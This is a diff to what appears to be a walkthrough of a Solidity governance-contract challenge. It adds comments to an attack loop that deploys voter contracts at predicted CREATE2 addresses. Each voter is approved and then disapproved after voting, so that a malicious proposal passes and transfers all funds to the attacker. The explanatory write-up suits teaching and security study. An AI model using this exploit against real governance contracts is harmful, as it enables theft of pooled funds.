@@ -49,13 +49,19 @@ Governance(_governance).createProposal(_player, data);
 The attacker creates a malicious proposal, including data that will transfer all funds to their account when executed.
 
 ```solidity
-// Approving Voters and Casting Votes
+// Attack loop
 while (attackCounter < 11) {
+    // Get the bytecode for the contract to be deployed.
+    // This contract is the VoterAttacker, which is responsible for voting on the proposal.
     bytes memory bytecode = type(VoterAttacker).creationCode;
+
+    // Encode the bytecode along with the necessary parameters.
     bytecode = abi.encodePacked(
         bytecode,
         abi.encode(_governance, proposalId, address(this))
     );
+
+    // Predict the deployment address using the encoded bytecode and salt (attackCounter).
     bytes32 hash = keccak256(
         abi.encodePacked(
             bytes1(0xff),
@@ -66,12 +72,22 @@ while (attackCounter < 11) {
     );
     address deployedAddr = address(uint160(uint(hash)));
 
+    // Use the Viceroy's authority to approve the voter at the predicted address.
     governance.approveVoter(deployedAddr);
-            new VoterAttacker{salt: bytes32(attackCounter)}(
-                _governance,
-                proposalId,
-                address(this)
-            );
-            governance.disapproveVoter(deployedAddr);
-            attackCounter++;
+
+    // Deploy the VoterAttacker contract at the predicted address.
+    new VoterAttacker{salt: bytes32(attackCounter)}(
+        _governance,
+        proposalId,
+        address(this)
+    );
+
+    // Disapprove the voter right after they've cast their vote.
+    // This creates a loophole where the voter is disapproved but their vote still counts.
+    governance.disapproveVoter(deployedAddr);
+
+    // Increment the attack counter, which also serves as the salt for the next iteration.
+    attackCounter++;
+}
+
 ```
